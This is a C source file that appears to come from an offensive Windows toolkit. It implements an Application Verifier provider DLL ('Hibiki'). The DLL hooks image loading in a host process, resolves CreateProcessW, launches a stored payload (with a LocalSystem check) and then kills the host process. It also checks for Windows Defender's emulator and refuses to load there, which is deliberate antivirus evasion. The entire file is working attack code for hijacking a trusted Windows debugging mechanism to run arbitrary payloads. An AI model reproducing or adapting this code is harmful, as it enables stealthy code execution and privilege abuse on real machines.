/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2018
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.00
*
*  DATE:        25 Aug 2018
*
*  AVrf entry point, Hibiki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(push)
#pragma warning(disable: 4005 4201)

#include <windows.h>
#include <ntstatus.h>
#include "shared\ntos.h"
#include "shared\minirtl.h"
#include "shared\util.h"
#include "shared\windefend.h"

#pragma warning(pop)

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define LoadedMsg      "Hibiki lock and loaded"

static RTL_VERIFIER_PROVIDER_DESCRIPTOR g_avrfProvider;
static RTL_VERIFIER_THUNK_DESCRIPTOR avrfThunks[2];
static RTL_VERIFIER_DLL_DESCRIPTOR avrfDlls[2];
static HMODULE g_pvKernel32;

PFNCREATEPROCESSW pCreateProcessW = NULL;

/*
* ucmLoadCallback
*
* Purpose:
*
* Image load notify callback, when kernel32 available - acquire import and run target application.
*
*/
VOID NTAPI ucmLoadCallback(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved
)
{
    BOOL bReadSuccess, bIsLocalSystem = FALSE;

    PWSTR lpParameter = NULL;
    ULONG cbParameter = 0L;

    UNREFERENCED_PARAMETER(DllSize);
    UNREFERENCED_PARAMETER(Reserved);

    if (DllName == NULL) {
        return;
    }

    if (_strcmpi(DllName, L"kernel32.dll") == 0) {
        g_pvKernel32 = DllBase;
    }

    if (_strcmpi(DllName, L"user32.dll") == 0) {
        if (g_pvKernel32) {
            
#pragma warning(push)
#pragma warning(disable: 4152)

            pCreateProcessW = ucmLdrGetProcAddress(
                (PCHAR)g_pvKernel32, 
                "CreateProcessW");

#pragma warning(pop)

            if (pCreateProcessW != NULL) {

                ucmIsLocalSystem(&bIsLocalSystem);

                bReadSuccess = ucmReadParameters(
                    &lpParameter,
                    &cbParameter,
                    NULL,
                    NULL,
                    bIsLocalSystem);

                ucmLaunchPayloadEx(
                    pCreateProcessW,
                    lpParameter,
                    cbParameter);

                if ((bReadSuccess) && 
                    (lpParameter != NULL)) 
                {
                    RtlFreeHeap(
                        NtCurrentPeb()->ProcessHeap,
                        0,
                        lpParameter);
                }

                NtTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
            }
        }
    }
}

/*
* ucmRegisterProvider
*
* Purpose:
*
* Register provider and set up image load notify callback.
*
*/
VOID ucmRegisterProvider(
    VOID
)
{
    RtlSecureZeroMemory(&avrfThunks, sizeof(avrfThunks)); //for future case

    avrfThunks[0].ThunkName = NULL;
    avrfThunks[0].ThunkOldAddress = NULL;
    avrfThunks[0].ThunkNewAddress = NULL;

    RtlSecureZeroMemory(&avrfDlls, sizeof(avrfDlls)); //for future case

    avrfDlls[0].DllName = NULL;
    avrfDlls[0].DllFlags = 0;
    avrfDlls[0].DllAddress = NULL;
    avrfDlls[0].DllThunks = avrfThunks;

    RtlSecureZeroMemory(&g_avrfProvider, sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR));
    g_avrfProvider.Length = sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR);
    g_avrfProvider.ProviderDlls = avrfDlls;
    g_avrfProvider.ProviderDllLoadCallback = (RTL_VERIFIER_DLL_LOAD_CALLBACK)&ucmLoadCallback;
}

/*
* DllMain
*
* Purpose:
*
* Verifier dll entry point, register verifier provider.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    PRTL_VERIFIER_PROVIDER_DESCRIPTOR* pVPD = lpvReserved;

    UNREFERENCED_PARAMETER(hinstDLL);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
        return FALSE;

    switch (fdwReason) {

    case DLL_PROCESS_VERIFIER:
        DbgPrint(LoadedMsg);
        ucmRegisterProvider();
        *pVPD = &g_avrfProvider;
        break;
    }

    return TRUE;
}
